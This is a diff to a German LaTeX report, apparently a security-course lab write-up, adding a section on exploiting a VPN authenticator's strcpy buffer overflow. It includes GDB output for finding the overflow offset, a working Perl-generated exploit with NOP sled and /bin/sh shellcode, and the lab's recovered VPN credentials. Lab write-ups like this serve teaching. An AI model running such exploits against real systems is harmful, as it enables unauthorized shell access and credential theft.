@@ -182,8 +182,116 @@ Nach Eingabe der manipulierten signierten Anfrage (Abbildung \ref{sigIn}) erlang
 \section{Strang 1 - Das geheime Labor}
 
 \subsection{VPN}
+Bei dieser Aufgabe wurde eine mangelhafte Implementierung eines VPN Clients ausgenützt um die lokal gespeicherten Benutzerdaten auszulesen. Es wurde ein Bufferoverflow verwendet, wodurch man dem VPN Authenticator zusätzliche Instruktionen übergeben kann. Die Durchführung eines Bufferoverflows besteht aus mehreren Schritten. Der erste Schritt ist eine Codeanalyse, mit deren Hilfe man potentielle Schwachstellen ausfindig machen kann, um die Eingabeparameter dementsprechend zu präparieren. Dies war in unserem Fall einfach, da der Sourcecode auf dem Server einsehbar war. Wir verwendeten für unseren Angriff eine fehlerhafte Anwendung der strcpy() Funktion, mit welcher man, im Falle einer fehlerhaften Anwendung, nicht vorgesehene Daten in den Speicher schreiben kann. Der Parameter für einen Bufferoverflow ist grundsätzlich aus mehreren Teilen aufgeteilt. Zuerst kommt eine Zeichenkette welche den Overflow auslöst. Der nächste Bereich ist die Zieladresse für den gewünschten Shellcode. Anschließend wird noch zwischen der Zieladresse und dem Shellcode eine größere Anzahl an NOP-Operationen eingefügt, um den Shellcode einfacher aufrufen zu können.\\
+Der nächste Schritt nach der Codeanalyse war das Suchen der Position für die Zieladresse für den Shellcode. Diesen Vorgang haben wir empirisch durchgeführt, wobei verschiedene Buchstabenketten übergeben wurden und das Speicherabbild anschließend mit dem GDB analysiert wurde. Die Rufzeichen markieren die 4 Byte des Speicherortes. (Listing \ref{aimaddressPlace}) \\
+Anschließend wurde mit Hilfe von GDB und dessen Speicherbild sowie einigen manuellen Versuchen der Register die Zielsprungadresse gesucht, Diese befindet sich mit bffff480 mitten untern den NOP Operationen (x90). Diese Adresse wurde für die Verwendung noch entsprechend transferiert in x80 xf4 xff xbf (Listing \ref{aimaddress}). \\
+Der nächste Teil besteht aus NOP Operationen, um eine NOP Sled zu ermöglichen. \\
+Der letzte Teil des präparierten Übergabeparameters besteht aus dem eigentlichen Shellcode welcher eine Shell startet und die notwendigen Berechtigungen setzt. Hierfür haben wir einen bereits vorgefertigten Shellcode verwendet. \footnote{http://www.enderunix.org/docs/en/bof-eng.txt} \\
+Für den Angriff selbst haben wir den Übergabeparameter mit Perl erzeugt, da der Parameter somit deutlich übersichtlicher ist. (Listing \ref{bufferattack}) \\ 
+Mit Hilfe des Angriffvektors konnte eine Shell mit ausreichend Rechten gestartet werden, mit welcher man die Datei \emph{vpn.conf} mit dem Programm \emph{cat} auslesen kann.
 
-TODO: BULLSHIT powered by Hochi
+\paragraph{Lösung}
+\begin{itemize}
+	\item Wie lauten die Zugangsdaten zum geheimen Netzwerk?  \\
+		Der Benutzername lautet \emph{simpleVpn} und das Passwort lautet \emph{chahz1Ah}.
+\end{itemize}
+
+
+\begin{lstlisting}[caption={Suche nach der Position der Zieladresse},label=aimaddressPlace]
+hanatos@advinetsec-ss11-shellaccts:~/vpn$ gdb vpn-auth
+GNU gdb 6.8-debian
+Copyright (C) 2008 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses
+/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show 
+copying"
+and "show warranty" for details.
+This GDB was configured as "i486-linux-gnu"...
+(gdb) start aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
+ccccddddee!!!!ffgggghhhhiiiijjjjkkkkllllmmmmbbbbbbbbbbbbbb
+bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+Breakpoint 1 at 0x80485bf
+Starting program: /home/thanatos/vpn/vpn-auth 
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890
+ccccddddee!!!!ffgggghhhhiiiijjjjkkkkllllmmmmbbbbbbbbbbbbbb
+bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+
+0x080485bf in main ()
+Current language:  auto; currently asm
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7ef644e in strncpy () from /lib/i686/nosegneg/libc.so.6
+(gdb) bt
+#0  0xb7ef644e in strncpy () from /lib/i686/nosegneg/libc.so.6
+#1  0x080485af in sanitize_input ()
+#2  0x21212121 in ?? () 
+#3  0x67676666 in ?? ()
+#4  0x68686767 in ?? ()
+#5  0x69696868 in ?? ()
+#6  0x6a6a6969 in ?? ()
+#7  0x6b6b6a6a in ?? ()
+#8  0x6c6c6b6b in ?? ()
+#9  0x6d6d6c6c in ?? ()
+#10 0x62626d6d in ?? ()
+#11 0x62626262 in ?? ()
+#12 0x62626262 in ?? ()
+#13 0x62626262 in ?? ()
+#14 0x62626262 in ?? ()
+#15 0x62626262 in ?? ()
+#16 0x62626262 in ?? ()
+#17 0x62626262 in ?? ()
+#18 0x62626262 in ?? ()
+...
+#44 0xb7fecf00 in ?? () from /lib/ld-linux.so.2
+Backtrace stopped: previous frame inner to this frame 
+(corrupt stack?)
+(gdb) \end{lstlisting}
+
+
+\begin{lstlisting}[caption={Suche Zieladresse},label=aimaddress]
+(gdb) info reg
+eax            0x61	97
+ecx            0xbffff1c8	-1073745464
+edx            0x67676665	1734829669
+ebx            0xb7fd8ff4	-1208119308
+esp            0xbffff188	0xbffff188
+ebp            0xbffff1a8	0xbffff1a8
+esi            0x67676666	1734829670
+edi            0x80484c0	134513856
+eip            0xb7ef644e	0xb7ef644e <strncpy+46>
+eflags         0x10202	[ IF RF ]
+cs             0x73	115
+\end{lstlisting}
+
+\begin{lstlisting}[caption={Attack call},label=bufferattack]
+./vpn-auth `perl -e 'print "Z"x516 . "\x80\xf4\xff\xbf" .
+ "\x90"x1024 . 
+ "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89
+ \xe1\x99\xb0\x0b\xcd\x80"'`
+\end{lstlisting}
+
+
 
 \subsection{Single Sign On}
 
